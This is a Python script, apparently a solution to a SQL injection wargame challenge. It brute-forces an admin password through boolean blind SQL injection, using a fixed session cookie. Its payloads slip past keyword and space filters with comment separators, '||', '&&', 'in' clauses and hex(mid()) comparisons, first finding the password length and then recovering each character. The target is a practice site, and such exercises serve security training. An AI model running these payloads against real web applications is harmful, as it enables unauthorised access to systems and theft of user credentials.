import requests

cookies={'PHPSESSID':'b61p6jj4h0n0rthn6uq0jjvdmr'}

for length in range(1,30):
    address="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
    url=address+"?no=1/**/||/**/id/**/in/**/(\"admin\")/**/%26%26/**/length(pw)/**/in/**/("+ str(length) +")%23"
    res=requests.get(url,cookies=cookies)

    if "Hello admin" in res.text:
        print("비밀번호 길이는??:"+str(length))
        break
    else:
        print(str(length)+"자리 아님")

i=length
pw=""
for a in range(1,i+1):
    for b in range(48,123):
        url= address+"?no=1/**/||/**/id/**/in/**/(\"admin\")/**/%26%26/**/hex(mid(pw,"+ str(a) +",1))/**/in/**/(hex("+ str(b) +"))%23"
        res=requests.get(url,cookies=cookies)

        if"<h2>Hello admin</h2>" in res.text:
            print(str(a)+"of pw----------->"+str(chr(b)))
            pw=pw+chr(b)
            break
print(pw)

